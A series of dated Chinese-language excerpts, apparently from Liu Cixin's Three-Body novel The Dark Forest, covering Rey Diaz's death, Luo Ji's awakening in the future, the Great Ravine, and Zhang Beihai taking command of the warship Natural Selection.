<p>增加每个节点对自身状态监测的灵敏度，具体作法就是每个通讯节点由多个单元组成，这些单元相距很远，但相互之间由连续的通讯联为一个整体，任何一个单元失效，整个节点就会发出终止反触发的命令，这之后，即使伪信号源再向下一节点发送信号也不被承认。各单元相互之间的监测精度目前可以达到微秒级，就是说，要按照刚才那位先生的办法，必须在一微秒内同时摧毁组成一个节点的所有单元，再用伪信号源进行信号接续。每个节点最少由三个单元组成，最多可能有几十个单元，这些单元之间的间距为三百公里左右，每一个都做得极其坚固，外界的任何触动都会令其发送警告。在一微秒之内同时使这些单元失效，也许三体人能做到，但人类目前肯定是做不到的。”</p>
<p>2016-01-18</p>
<p>人们惊奇地发现，这个壮汉的眼中竟闪着泪光，他最后说：“我要回到祖国了，这不是计划的一部分。”</p>
<p>2016-01-18</p>
<p>在同伽尔宁走出联合国会议厅的大门时，雷迪亚兹对着正午的太阳张开了双臂，陶醉地呼唤道：“啊，我的太阳！”他持续二十多年的恐日症消失了。</p>
<p>2016-01-18</p>
<p>机舱中，伽尔宁对雷迪亚兹说：“有我在，这架飞机是安全的，请您告诉我那个处于反触发状态的装置的位置。”</p>
<p>“没有什么装置，什么都没有，只是逃跑的伎俩而已。”雷迪亚兹摘下手表，扔给伽尔宁，“这不过是个简单的信号发射器，摩托罗拉手机改的，与我的心跳什么的也没有关系，已经关了，你留下做个纪念吧。”</p>
<p>在长时间的相对无语后，伽尔宁长叹一声说：“怎么会是这样？面壁者的封闭性战略思考特权，本意是对付智子和三体世界的，现在，你和泰勒都用它来对付人类自己。”</p>
<p>“这没什么奇怪的。”雷迪亚兹坐在舷窗旁，享受着外面射入的阳光，“现在，人类生存的最大障碍其实来自自身。”</p>
<p>2016-01-18</p>
<p>雷迪亚兹在玻利瓦尔铜像前下车，站在铜像的基座上，他的上方，曾打败西班牙并试图在南美建立大哥伦比亚统一共和国的英雄身披铠甲，纵马驰骋。他的前方，由狂热的民众组成的人群在阳光下沸腾，人们向前拥来，军警的队伍极力阻挡，甚至对空鸣枪，但汹涌的人潮最终还是冲垮了军警线，向铜像下活着的“玻利瓦尔”拥来。</p>
<p>雷迪亚兹高举双手，含着热泪对着拥向他的人潮深情地呼唤道：“啊，我的人民！”</p>
<p>他的人民扔来的第一块石头打在他高举的左手上，第二块石头击中了他的前胸，第三块砸在前额上并击倒了他。随后，人民的石头像雨点般飞来，最后几乎埋住了他那早已没有生命的躯体。砸向面壁者雷迪亚兹的最后一块石头是一位老太太扔的，她吃力地举着一块石头一直走到雷迪亚兹的尸体前，用西班牙语说：</p>
<p>“恶人，你要杀所有的人，那里面可是有我的孙子，你竟想杀我的孙子！”</p>
<p>说着，她用尽力气，颤巍巍地把手中的石头砸到雷迪亚兹从石堆中露出的已经破碎的头颅上。</p>
<p>2016-01-18</p>
<p>唯一不可阻挡的是时间，它像一把利刃，无声地切开了坚硬和柔软的一切，恒定地向前推进着，没有任何东西能够使它的行进出现丝毫颠簸，它却改变着一切。</p>
<p>2016-01-18</p>
<p>在三体危机出现后的一个世纪，曾经在黄金时代生活过的人们都离开了人世。所谓黄金时代，是指从上世纪八十年代开始至三体危机出现时结束的美好时光，这个时代在以后一直被人不断地回忆，经历过这段美好岁月的老人像反刍动物似的不断把那段记忆吐出来，甜蜜地咀嚼，最后总是加上一句：“唉，那时咋就不懂得珍惜呢？”而听他们讲述的年轻人目光中充满嫉妒，同时也将信将疑：那神话般的和平、繁荣和幸福，那世外桃源般的无忧无虑，是否真的存在过？</p>
<p>2016-01-18</p>
<p>随着老人们的离去，渐渐远去的黄金海岸完全消失在历史的烟波之中。现在，人类文明的航船已经孤独地驶到了茫茫的大洋中，举目四望，只有无边无际的险恶波涛，谁也不知道，彼岸是不是真的存在。</p>
<p>危机纪年第205年，三体舰队距太阳系2.10光年</p>
<p>2016-01-18</p>
<p>黑暗出现了，这之前连黑暗都没有，只有虚无。虚无是无色彩的，虚无什么都没有，有黑暗，至少意味着出现了空间。很快，黑暗的空间中出现了一些扰动，像穿透一切的微风，这是时间流逝的感觉。之前的虚无是没有时间的，现在时间也出现了，像消融的冰河。光的出现是在很长时间以后，开始，只是一片没有形状的亮斑，又经过了漫长的等待，世界的形状才显现出来。</p>
<p>2016-01-18</p>
<p>罗辑被他们的目光所慑服，他知道，普通人的目光，是他们所在地区和时代的文明程度的最好反映。他曾经看到过一组由欧洲摄影师拍摄的清朝末年的照片，最深的印象就是照片上的人呆滞的目光，在那些照片上，不论是官员还是百姓，眼睛中所透出的只有麻木和愚钝，看不到一点生气。</p>
<p>2016-01-18</p>
<p>在与罗辑相视的目光中，充满着睿智的生机，以及他在自己的时代很少感受到的真诚、理解和爱意。但从心灵的最深处打动罗辑的，是人们目光中的自信，这种阳光般的自信充满了每一双眼睛，显然已经成为新时代人们的精神背景。</p>
<p>2016-01-18</p>
<p>在罗辑听来，这是天使的声音，他觉得自己倒是变成了一个从噩梦中醒来的孩子，所经历的可怖的一切大人们只是付之一笑。在天使说话时，她的护士服上映出了一轮飞快升起的朝阳，在金色的阳光下，原本枯黄的大地迅速变绿，花儿在疯狂地开放……</p>
<p>2016-01-18</p>
<p>护士走后，罗辑仍捧着那个杯子不放，他没注意熊文的嘲笑，只觉得心潮澎湃，知道自己其实是捧着一个人类千古梦想的圣物——捧着的是永动机。如果人类真的得到了无尽的能量，那他们几乎可以得到一切了，现在他相信了美丽护士的话：事情可能真的没那么严重</p>
<p>2016-01-18</p>
<p>当医生来到监护室进行例行检查时，罗辑向他问起了面壁计划。</p>
<p>“知道，古代的笑话。”医生随口答道。</p>
<p>2016-01-18</p>
<p>护士从更衣室出来，换上了自己的衣服，除了表面闪亮的动态图像外，这个时代女孩子衣着款式的变化至少在罗辑的想象范围之内，与自己的时代相比，主要是凸现了不对称性，他很高兴在一百八十五年后，还能在一个女孩子的服装上得到美感。</p>
<p>2016-01-18</p>
<p>罗辑把目光向下移，立刻感到了一阵眩晕，他身处高处，而从这里看到的，他好半天才意识到，是城市。开始他以为自己看到的是一片巨型森林，一根根细长的树干直插天穹，每根树干上都伸出与其垂直的长短不一的树枝，而城市的建筑就像叶子似的挂在这些树枝上。建筑的分布似乎很随意，不同大树上的叶子有疏有密。罗辑很快看到，他所在的冬眠苏醒中心其实就是一棵大树的一部分，他就住在一片叶子里，现在，他们正站在悬挂这片叶子的一根树枝上，这就是他看到的那条伸延到前方的狭长平台。回头，他看到了自己所在的这棵大树的树干，向上升到他看不到的高度。他们所在的树枝可能位于树的中上部，向上或向下，都能看到其他的树枝和挂在上面的建筑叶子。（后来他知道，城市的地址真的就是××树××枝××叶。</p>
<p>2016-01-18</p>
<p>天和太阳都是假的。”女孩儿努力收住笑说，“当然，说是假的也不对，是从上面的一万米高空拍的图像，在下面放映出来的，也算是真的吧。”</p>
<p>2016-01-18</p>
<p>罗辑转身刚要道别，却吃惊得说不出话来，他看到女孩儿把那伞——或她说的自行车——像背包似的背到后背上，然后伞从她后面立了起来，在她头上展开来，形成了两个同轴的螺旋桨，它们无声地转动起来——是相互反向转动，以抵消转动力矩。女孩儿慢慢升起，向旁边跳出栏杆，跃入那让罗辑目眩的深渊中。她悬浮在空中对罗辑大声说：</p>
<p>“你看到了，现在是个挺不错的时代，就把你的过去当做一场梦吧。明天见！”</p>
<p>她轻盈地飞去，小螺旋桨搅动着阳光，远远地飞过两棵巨树之间，变成了一只小小的蜻蜓，有一群群这样的蜻蜓在城市的巨树间飞翔，但最引人注目的还是飞行的车流，像海底植物间川流不息的鱼群。朝阳照进了城市，被巨树分隔成一缕缕光柱，给空中的车流镀上了一层金辉。</p>
<p>2016-01-18</p>
<p>在宣布会议开始后，主席首先发言：“各位代表，在这次会议上，我们将对本年度第47次联席会议提出的649号提案进行最后表决，该提案是由北美舰队和欧洲舰队联合提交的。我首先宣读提案内容。</p>
<p>“在三体危机出现后的第二年，联合国行星防御理事会制定了面壁计划，并取得了各常任理事国的一致通过，于次年开始执行。面壁计划的核心内容，是由经过各常任理事国选定和推举的四位面壁者进行完全封闭的个人思考，制定并执行对抗三体世界入侵的战略计划，以避开智子对人类世界无所不在的监视，从而实现战略的隐蔽性。联合国推出了相应的面壁法案以保证面壁者制定和执行计划的特权。</p>
<p>“面壁计划至今已经进行了二百零五年，其间，有过长达一个多世纪的停顿期。在这期间，计划的领导权由原行星防御理事会移交到现太阳系舰队联席会议。</p>
<p>2016-01-18</p>
<p>面壁计划的产生有特定的历史背景。当时，三体危机刚刚出现，面对这个人类历史上史无前例的毁灭性危机，国际社会陷入了空前的恐惧和绝望中，面壁计划正是在这样的状态下诞生的，它不是理智的选择，而是绝望的挣扎。</p>
<p>“历史事实证明，面壁计划是一个完全失败的战略计划。毫不夸张地说，它是人类社会作为一个整体，有史以来所做出的最幼稚、最愚蠢的举动。面壁者被赋予空前的、不受任何法律监督的权力，甚至被赋予欺骗国际社会的自由，这违背了人类社会最基本的道德和法律准则。</p>
<p>“在面壁计划的执行过程中，大量的战略资源被没有意义地消耗，面壁者弗雷德里克·泰勒的量子舰队计划已被证明没有任何战略意义，而面壁者雷迪亚兹的水星坠落连锁反应计划，即使以目前人类的能力也根本无法实现。同时，这两个计划都是犯罪，泰勒企图攻击并消灭地球舰队，雷迪亚兹的企图则更加邪恶，竟然把整个地球生命世界作为人质。</p>
<p>“另外两位面壁者也同样令人失望。面壁者希恩斯的思维提升计划目前还没有暴露出其真实的战略意图，但其初步阶段的成果——思想钢印，在太空军中的使用也是犯罪，它严重地侵犯了思想自由，而后者是人类文明存在和进步的基础。至于面壁者罗辑，他先是不负责任地用公共资源为自己营造享乐生活，其后又以可笑的神秘主义举动哗众取宠。</p>
<p>“我们认为，随着人类力量的决定性增强和对战争主动权的把握，面壁计划已经没有意义，现在是结束这一历史遗留问题的最佳时间。我们建议舰队联席会议立刻中止面壁计划，同时废除联合国面壁法案。</p>
<p>“特此提交本提案。”</p>
<p>主席把提案文本缓缓放下，扫视了一下会场说：“现在开始对太阳系舰队联席会议649号提案进行表决。”</p>
<p>2016-01-18</p>
<p>山杉惠子突然冷笑起来，露出一种这个时代很少见到的表情，让与会者们联想到在某个古老的年代，草丛中蛇的鳞片反射的月光。</p>
<p>2016-01-18</p>
<p>杉惠子轻轻摇摇头，“思想钢印是极其复杂的设备，任何监督都会有疏漏的，特别是对几亿行代码中的一个小小的正负号而言，这一点，甚至连智子都没察觉到。”</p>
<p>“正负号？”</p>
<p>“在发现了对命题判断为真的神经回路模式时，希恩斯同时也发现了对命题判断为伪的模式，后者正是他所需要的。他对包括我在内的所有人都隐瞒了这个发现，这并不难，因为这两种神经回路的模式十分相似，在神经元传输模式中表现为某个关键信号的流向；而在思想钢印的数学模型中，则只由一个正负号决定，正者判断为真，负者判断为伪。希恩斯用极其隐蔽的手段操纵了思想钢印控制软件中的这个符号，在所有五台思想钢印中，这个符号都为负。”</p>
<p>死一般的寂静笼罩了会场，这种寂静曾经在两个世纪前的那次行星防御理事会的面壁计划听证会上出现过，当时，雷迪亚兹展示了手腕上的“摇篮”，并告诉与会者，接收它的反触发信号的装置就在附近。</p>
<p>2016-01-18</p>
<p>不过是无线供电而已，电源用微波或其他形式的电磁振荡来发射电能，在一定的空间范围形成供电场，这个范围内的任何用电设备都可以用天线或电磁共振线圈来接收电能。</p>
<p>2016-01-18</p>
<p>这时，罗辑才真正注意到他们置身其中的雕塑群，他发现那些柱状物并不是什么枯树，而是一只只从沙漠中向上伸展的手臂，这些手臂都瘦得皮包骨头，所以初看上去像枯树干，顶上的那些手都对着天空做出各种极度扭曲的姿态，像是表达着无尽的痛苦。</p>
<p>“这是什么雕塑？”罗辑置身于这群对天挣扎的手臂中，虽然出了一身汗，还是感到阵阵寒意。在雕塑群的边缘，罗辑看到了一块肃穆的方碑，上面刻着一行金色的大字：</p>
<p>2016-01-18</p>
<p>岁月以文明，而不是给文明以岁月。</p>
<p>2016-01-18</p>
<p>章北海的眼睛中，有两个小太阳在燃烧，他说：“首长，这恐怕不行。”</p>
<p>“接到任务先说不行，这不是我们的传统吧。”</p>
<p>司令官话中的“我们”和“传统”这两个词让章北海有一种温暖的感觉，他知道，两个世纪前那支军队的血脉仍在太空舰队中延续。</p>
<p>2016-01-19</p>
<p>在方阵前面有三名军官，章北海的目光最后落在中间的那位美丽的年轻女性身上，她的肩上有四颗星在闪亮，应该是“自然选择”号的舰长。她是太空新人类的典型代表，比起身材高大的章北海来还要高出不少，她从方阵前轻盈地移过来，那高挑苗条的身材像飘浮在空间中的一个飘逸的音符。当她在章北海和参谋长面前停下时，本来飘在后面的秀发很有弹性地在白皙的颈项旁跳动着，她的眼睛充满清澈的阳光和活力，章北海立刻信任了她，因为钢印族不可能有这样的目光。</p>
<p>2016-01-19</p>
<p>我是‘自然选择’号舰长东方延绪。”她向章北海敬礼说，眼睛中露出一种俏皮的挑战，“我代表全舰官兵送前辈一件礼物。”她向前伸出双手，章北海看到了她拿着的那件东西，外形虽变化很大，但他仍能认出那是一支手枪，“如果真发现我有失败主义思想和逃亡企图，前辈可以用它杀了我。”</p>
<p>2016-01-19</p>
<p>七十年后又续了产权，但接着住了不长时间就拆迁了，后来买的那一套倒是还在，我也没去看过。”史晓明指指外面，“现在城里的人口还不及我们那时的百分之一，知道这里最不值钱的是什么？就是爸你一辈子供的房子，现在都空着，随便住了。”</p>
<p>2016-01-19</p>
<p>……</p>
<p>2016-01-19</p>
<p>大低谷是怎么回事？”罗辑问出了他早想问的问题。</p>
<p>2016-01-19</p>
<p>你们这些天来多少也知道一些吧，这说起来话长了。你们冬眠后的十几年里，日子过得还行，但后来，世界经济转型加速，生活水平一天天下降，政治空气也紧张起来了，真的感觉像是战争时期了。”</p>
<p>2016-01-19</p>
<p>一个邻居说：“不是哪几个国家，全球都那样儿，社会上很紧张，一句话说不对，就说你是ETO或人奸，搞得人人自危。还有黄金时代的影视，开始是限制，后来全世界都成禁品了，当然东西太多也禁不住。”</p>
<p>“为什么？”</p>
<p>“怕消磨斗志呗。”史晓明说，“不过只要有饭吃，还能凑合着过，但后来，事情不妙了，全世界都开始挨饿，这大概是罗老师他们冬眠后二十多年的事吧。”“是因为经济转型？”</p>
<p>“是，但环境恶化也是重要原因。当时的环保法令倒还都有，但那正是悲观时期，人们普遍都有一个想法：环保有屁用？就算把地球保成一个花园儿，还不是留给三体人？到后来，环保甚至与ETO画上等号，成了人奸行为，像绿色和平组织这类的，都给当做ETO的分支镇压了。太空军工使得高污染重工业飞速发展，环境污染是制止不了了，温室效应，气候异常，沙漠化……唉。”</p>
<p>“我冬眠以前正是沙漠化开始时。”另一个邻居说，“不是你们想象的那样儿，沙漠从长城那边儿向这边儿推进，不是！那叫插花式侵蚀，内地好好的一块块地方，同时开始沙化，从各个点向外扩散，就像一块儿湿布被晒干那样。”</p>
<p>“然后是农业大减产，储备粮耗光，然后……然后就是大低谷了。”</p>
<p>“生活水平倒退一百年的预言真成了现实？”罗辑问。</p>
<p>史晓明苦笑三声，“我的罗老师啊，倒退一百年？您做梦吧！那时再往前一百年就是……二十世纪三十年代左右吧，与大低谷相比那是天堂了！大低谷不比一九三几年，人多啊，八十三亿！”他说着指指张延，“他见过大低谷，那时他苏醒过一阵儿。”</p>
<p>张延喝干了一杯酒，两眼发直地说：“我见过饥饿大进军，几千万人逃荒，大平原上沙土遮天，热天热地热太阳，人一死，立马就给分光了……真他妈是人间地狱，影像资料多的是，你们可以自己看，想想那个时候都折寿啊。”</p>
<p>“大低谷持续了半个世纪吧，就这么五十来年，世界人口由八十三亿降到三十五亿，你们想想吧，这是什么事儿！”</p>
<p>2016-01-19</p>
<p>罗辑站起身走到窗前，从这里可以越过防沙林带眺望外面的沙漠，黄沙覆盖的华北平原在正午的阳光下静静地向天边延伸，时间的巨掌已经抚平了一切。</p>
<p>“后来呢？”大史问。张延长出一口气，好像不用再谈那一段历史让他如释重负似的，“后来嘛，有人想开了，越来越多的人想开了，都怀疑即使是为了末日战争的胜利，付出这么多到底值不值。你们想想，怀里快饿死的孩子和延续人类文明，哪个重要？你们现在也许会说后者重要，但把你放到那时就不会那么想了，不管未来如何，当前的日子才是最重要的。当然，在当时这想法是大逆不道，典型的人奸思想，但越来越多的人都这么想，很快全世界都这么想了，那时流行一句口号，后来成了历史的名言……”</p>
<p>2016-01-19</p>
<p>‘给岁月以文明，而不是给文明以岁月。’”罗辑接下来说，他仍看着窗外没有回头。</p>
<p>“对对，是这个，给岁月以文明。”</p>
<p>“再后来呢？”史强又问。</p>
<p>“第二次启蒙运动，第二次文艺复兴，第二次法国大革命……那些事儿，你们看历史书去吧。”</p>
<p>罗辑惊奇地转过身来，他向庄颜预言过的事竟然提前两个世纪变成现实了。“第二次法国大革命？还在法国？”</p>
<p>“不不，只是这么个说法，是在全世界！大革命后，新上来的各国政府都全部中止了太空战略计划，集中力量改善民生。当时出现了一个很关键的技术：利用基因工程和核聚变的能量，集中大规模生产粮食，结束了靠天吃饭的日子，这以后全世界才不再挨饿。接着一切都恢复得很快，毕竟人少了，只用了二十多年时间，生活就恢复到了大低谷前的水平，然后又恢复到黄金时代的水平。人类铁了心地沿着这条舒服道儿走下去，再也不打算回头了。”</p>
<p>“有一个说法罗博士一定感兴趣。”一个邻居凑近罗辑说，他在冬眠前是一名经济学家，想问题也深些，“叫文明免疫力，就是说人类世界这大病一场，触发了文明机体的免疫系统，像前危机时期那样的事儿再也不会发生了，人文原则第一，文明延续第二，这已是当今社会的基础理念。”</p>
<p>“再后来呢？”罗辑问。</p>
<p>“再后来，邪门儿的事儿发生了。”史晓明兴奋起来，“本来，世界各国都打算平平安安过日子，把三体危机的事儿抛在了脑后，可你想怎么着？一切都开始飞快进步，技术进步最快，大低谷前太空战略计划中的那些技术障碍竟然一个接一个都突破了！”</p>
<p>“这不邪门儿，”罗辑说，“人性的解放必然带来科学和技术的进步。”</p>
<p>“大低谷后大约过了半个世纪的平安日子吧，全世界又想起三体入侵这回事了，觉得还是应该考虑战争的事，况且现在人类的力量与大低谷前不可同日而语。于是又宣布全球进入战争状态，开始建造太空舰队。但这次和以前不一样，各国都在宪法上明确：太空战略计划所消耗的资源应限制在一定的范围内，不应对世界经济和社会生活产生灾难性的影响。太空舰队就是在这一时期成为独立国家的……”</p>
<p>“其实你们现在不用考虑那么多的事儿，”经济学家说，“只想着怎么把今后的日子过好就行，那句革命中的名言，其实是套用帕斯卡的一句话：给时光以生命，而不是给生命以时光。来，为了新生活！”他们喝干了最后一杯酒，罗辑向经济学家致意，认为这话说得很好，他现在心里所想的，只有庄颜和孩子，他要尽快安顿下来，再去苏醒她们。</p>
<p>给岁月以文明，给时光以生命。</p>
<p>2016-01-19</p>
<p>这是章北海看到的另一个以前很少有人想象到的现代技术特色——去设施倾向。这种倾向在地球上还只是初露端倪，但“去设施化”已成为比地球世界更先进的舰队世界的基本结构。这个世界到处都是简洁空旷的，几乎见不到任何设施，只有在需要时，设施才会出现，而且是在任何需要的位置出现。世界在被技术复杂化后，正在重新变得简洁起来，技术被深深地隐藏在现实的后面</p>
<p>2016-01-19</p>
<p>但你做不到，即使有权限好像也不行，只有检测到全体乘员都处于深海状态时，系统才会进入‘前进四’推进。”</p>
<p>当处于最高推进功率时，飞船的加速将达到120G，所产生的超重是正常状态下人体承受极限的十多倍，这时就要进入深海状态，即在舱室中注满一种叫“深海加速液”的液体，这种液体含氧量十分丰富，经过训练的人员能够在液体中直接进行呼吸，在呼吸过程中，液体充满肺部，再依次充满各个脏器。这种液体早在20世纪上半叶就有人设想过，当时的主要目的是实现超深潜水，当人体充满深海加速液时，与深海中的压力内外平衡，就具备了深海鱼类那样的超级承压能力。在飞船超高加速的过载状态下，充满液体的舱室压力环境与深海类似，这种液体现在被用于作为宇宙航行超高加速中的人体保护液，所谓“深海状态”也就由此得名。</p>
<p>2016-01-19</p>
<p>东方延绪伸出修长的手臂在空中转了一圈，章北海一直也没有学会用超导腰带做这个动作。</p>
<p>2016-01-19</p>
<p>我们那时已经不升火了，不过看得出来，你对海军的历史很了解。”章北海尽力避开这个容易使她对自己产生敌意的敏感话题。</p>
<p>“一个浪漫的军种。”</p>
<p>“太空舰队不是继承了这种浪漫吗？”</p>
<p>“是的，不过我就要离开它了，我打算辞职。”</p>
<p>“因为审查？”</p>
<p>东方延绪转头看着章北海，她那浓密的黑发又在失重中弹跳起来，“你们那时经常遇到这种事儿，是吗？”</p>
<p>“也不一定，但如果遇到，每个同志都会理解的，接受审查也是军人职责的一部分。”“两个世纪已经过去，这不是你们的时代了。”</p>
<p>“东方，不要有意拉大代沟，我们之间总是有共同之处的，任何时代，军人都需要忍辱负重。”</p>
<p>“这是在劝我留下吗？”</p>
<p>“不是。”</p>
<p>“思想工作，是这个词吧，这不曾经是你的职责吗？”</p>
<p>“现在不是了，我有新的职责。”</p>
<p>东方延绪在失重中轻盈地围着章北海飘浮着，似乎在仔细研究他，“是不是在你们眼里，我们都是孩子？半年前我到过地球一次，在一个冬眠者居住区，一个六七岁的男孩儿叫我孩子。”</p>
<p>2016-01-19</p>
<p>章北海笑了笑。</p>
<p>“你这人几乎不笑，也许正是因为这样，笑起来时很有魅力……我们是孩子吗？”</p>
<p>“在我们那时，辈分是很重要的，在当时的农村，也有大人依照辈分把孩子叫大伯大姑的。”</p>
<p>“但你的辈分在我眼中不重要。”</p>
<p>“这我从你眼里看出来了。”</p>
<p>“你觉得我的眼睛好看吗？”</p>
<p>“像我女儿的眼睛。”章北海不动声色的回答迅速而从容，令东方延绪很吃惊。他并没有把目光从东方身上移开，她身处洁白的球体中，仿佛整个世界都因她的美丽而隐去了似的。</p>
<p>“你女儿，还有妻子，没陪你来吗？据我所知，特遣队的家属都可以冬眠。”</p>
<p>“她们没有来，也不想让我来，你知道，按当时的趋势，未来的前景是很黑暗的，她们责备我这样做不负责任。她和她母亲都不回家住了，可就在她们离开后的第二天深夜，特遣队出发的命令下来了，我都没来得及同她们最后见上一面。那是个冬天的深夜，很冷，我就那么背着背包离开了家……当然，我没指望你能理解这些。”</p>
<p>“理解……她们后来呢？”</p>
<p>“我妻子是在危机47年去世了，女儿在81年去世了。”</p>
<p>“都经历了大低谷。”东方延绪垂下眼睛，沉默了一会儿后，她在面前激活了一个全息显示窗口，把整体显示模式调到外部状态。</p>
<p>2016-01-19</p>
<p>白色的球形舱壁像蜡一样消融了，“自然选择”号本身也消失了，他们悬浮在无际的太空中。面对着银河系迷雾般的星海，他们变成了宇宙中两个独立的存在，不依附于任何世界，四周只有空间的深渊，同地球、太阳和银河系一样悬浮于宇宙中，没有从哪里来，也不想到哪里去，只是存在着……章北海有过这种感觉，那是一百九十年前，他穿着航天服只身悬浮于太空中，握着装有陨石子弹的手枪……</p>
<p>“我喜欢这样，飞船和舰队什么的，都是外在的工具，在精神上都是可以省略的。”东方延绪说。</p>
<p>“东方。”章北海轻轻地唤了一声。</p>
<p>“嗯？”美丽的舰长转过身来，她的双眸中映着银河系的星光。</p>
<p>2016-01-19</p>
<p>如果有一天我不得不杀了你，请原谅。”章北海轻声说。</p>
<p>东方延绪对这话付之一笑，“你看我像钢印族吗？”</p>
<p>章北海看看她，在从五个天文单位外照来的阳光中，她像是一根飘浮在星海背景上的轻盈的羽毛。</p>
<p>“我们属于大地和海洋，你们属于星空。”</p>
<p>“这样不好吗？”</p>
<p>“不，这样很好。”</p>
<p>2016-01-19</p>
<p>罗宾逊将军第一次没有为舰队辩解。本来，亚洲舰队已经派出了三艘轻型高速飞船去对探测器进行近距离跟踪，但三大舰队随之爆发了拦截权之争，后来联席会议又做出了所有战舰回港的决议。尽管亚洲舰队反复解释，说这三艘飞船都是歼击机级别的，为了尽快加速，拆除了所有的武器和外部设施，每艘船上只有两名乘员，只能跟踪目标，根本不可能进行拦截行动，但欧洲和北美两大舰队还是不放心，坚持已起航的跟踪飞船必须全部撤回，改由第四方地球国际派出三艘跟踪飞船。如果不是这样，现在跟踪飞船已经与探测器近距离接触并进行跟踪了。而地球上由欧洲联合体和中国后来派出的跟踪飞船，现在还没有飞出海王星轨道。</p>
<p>2016-01-19</p>
<p>之所以叫这个名称，是因为这种物质蒸发后的气体在太空中扩散性很强，少量物质就可以形成大片尘埃，其过程与小小的油滴在水面扩散成大片分子厚度的油膜相似。油膜物质所形成的太空尘埃还有另一特性：与其他的太空尘埃不同，“油膜尘埃”很难被太阳风所驱散。正是由于油膜物质的发现，使“雾伞”计划成为可能，这个计划是用核爆炸在太空中蒸发和扩散油膜物质，在太阳与地球之间形成一团“油膜尘埃”，降低太阳对地球的辐射，达到缓解地球温室效应的目的。</p>
<p>2016-01-19</p>
<p>两个世纪前面壁者雷迪亚兹的战略计划中所研制的恒星型氢弹，后来共制造了五千多颗。虽然这种武器在末日之战中作用有限，但正如雷迪亚兹所言，各大国主要是为可能爆发的人类之间的行星际战争准备的，核弹主要在大低谷时期制造，那时由于资源匮乏，国际关系极其紧张，人类自身的战争一触即发。进入新时期后，这些骇人听闻的武器成了危险的鸡肋，虽然其所有权都属于地球国家，但还是被送入太空存贮，少部分已经用于行星工程的爆破，还有一部分送入太阳系外围轨道。曾有人设想将核弹中的聚变材料作为远程飞船的燃料补充，但由于核弹的拆解很困难，这个设想一直没有真正实现。</p>
<p>2016-01-19</p>
<p>你觉得能行？”罗宾逊两眼放光地问道，他后悔这么简单的事自己怎么没想到，一个载入史册的机会让肯抢去</p>
<p>2016-01-19</p>
<p>驾驶员在脑子里极力想象着这个巨大但稀薄的存在。几天前，他和指令长亲眼目睹了这团巨云压缩成固体时的大小。当时，来自海王星的巨型飞船“太平洋”号停泊在这片太空，放下了它运载的五件货物。首先放置的是来自前战争时期的一颗恒星型氢弹，它是一个长五米、直径一点五米的圆柱体；随后，飞船的机械臂从舱内取出了四个大球体，它们的直径从三十米到五十米不等，这四个球体被放置在氢弹周围几百米处，它们都是采自海王星星环的油膜物质。“太平洋”号飞离后，氢弹爆炸，所形成的小太阳把光和热量疯狂地倾泻到这寒冷的太空深渊中，周围的球体瞬间汽化，油膜气体在氢弹辐射的飓风中迅速扩散，随后在冷却中化为无数微小的颗粒，尘埃云形成了。这团云的直径达两百万公里，超过太阳的直径。</p>
<p>2016-01-19</p>
<p>尘埃云形成的位置，是三体探测器预计将要通过的区域，这是按三体探测器的发动机停机前所观测到的轨道计算出来的。肯博士和罗宾逊将军的这个计划，是期望通过三体探测器在人造尘埃云中留下的尾迹精确测定它的轨道和位置。</p>
<p>2016-01-19</p>
<p>尾迹只能由一百多个天文单位外的太空望远镜观测到，在“蓝影”号上无论是尘埃云还是自己的尾迹，什么都看不到，周围的太空空寂依旧。不过在穿过云团后，太阳处于云后，这时驾驶员坚持说看出太阳变暗了一点点，而且它原来清晰的边缘变得模糊了，仪器的观测也证明了这一点，这是这个巨大的人造物留给他们的唯一视觉印象。</p>
<p>2016-01-19</p>
<p>蓝影”号按照探测器的轨道参数设定航向，再次进入看不见的尘埃云，向三体探测器飞去。这次飞行的时间显得很长，十多个小时过去了，指令长和驾驶员都很困倦，但与目标不断缩小的距离还是令他们紧张起来。</p>
<p>“看到它了！我看到它了！”驾驶员大喊起来。</p>
<p>“你胡说什么？还有一万四千多公里呢！”指令长训斥道，即使在全透明的太空中，肉眼也不可能看到一万四千公里外的一辆卡车。但很快，他自己也看到了，在轨道参数所指示的方向，在静止的星空背景上，有一个亮点在移动。</p>
<p>2016-01-19</p>
<p>经过短暂的思考，指令长明白了：这团比太阳还大的尘埃云是白造了，三体探测器又启动了它的发动机，继续减速，它不打算掠过太阳系，它将留在这里。</p>
<p>2016-01-19</p>
<p>在这个时代，技术的极致发展并未能掩盖基础理论的停滞，“自然选择”号对权限的识别仍然采用章北海在过去的时代就熟悉的瞳孔、指纹和口令的三位一体，太空战舰的人工智能仍然无法识别出一个人的面容。</p>
<p>2016-01-19</p>
<p>总参特别小组完成了系统中舰长权限识别的瞳孔和指纹数据的重新设定，然后东方延绪向章北海交出了她的口令：</p>
<p>“Men always remember love because of romance only.”东方延绪说出口令后，用挑战的目光看着章北海。</p>
<p>2016-01-19</p>
<p>你好像不抽烟。”章北海从容应对。</p>
<p>2016-01-19</p>
<p>“而且这个牌子已经在大低谷时消失了。”东方延绪带着一丝失望垂下眼睛说。</p>
<p>2016-01-19</p>
<p>不过这个口令真的很好，在那时也没有多少人知道。”章北海说。</p>
<p>2016-01-19</p>
<p>舰长和副舰长都离开了，章北海将独自修改舰长的口令，最后取得对“自然选择”号的舰长控制权。</p>
<p>“他真的很聪明。”当球形舱的门消失后，井上明说。</p>
<p>“古代的智慧。”东方延绪说，她盯着舱门消失的地方，像要把那里看透似的，“他从两个世纪前带来的东西，我们永远学不会；可他却能学会我们的。</p>
<p>2016-01-19</p>
<p>然后三人沉默了，静静地等待着。五分钟过去了，对于重置口令的操作，这时间显然太长了，而即将成为舰长的章北海，是培训后的特遣队成员中对战舰指挥系统操作最熟练的人。又过了五分钟，两名副舰长不耐烦地在廊道里浮游起来，只有东方延绪仍静静地站立不动。</p>
<p>终于，门又在舱壁上出现了。三人惊奇地发现，球形舱里变黑了，章北海调出了星图的全息显示，并屏蔽了图上所有的标度线，只留下闪亮的星星，以至从门这边看去，他仿佛悬浮于飞船外的太空中，与他一起悬浮着的还有一块亮着的操作界面。</p>
<p>2016-01-19</p>
<p>“我做完了。”章北海说。</p>
<p>“怎么用了这么长时间？”列文不满地问。</p>
<p>“你是在享受得到‘自然选择’号的快感吗？”井上明问。</p>
<p>章北海没有说话，他的眼睛也没看操作界面，而是遥望着星图上远方的星辰，东方延绪注意到，在他注视的方向，有一个绿色光点在闪动。</p>
<p>“要是那样就太可笑了。”列文接过井上明的话说，“我需要提醒你，舰长仍是东方大校，执行舰长不过是一道防火墙而已，这样说不怎么好听，但最接近实情。”</p>
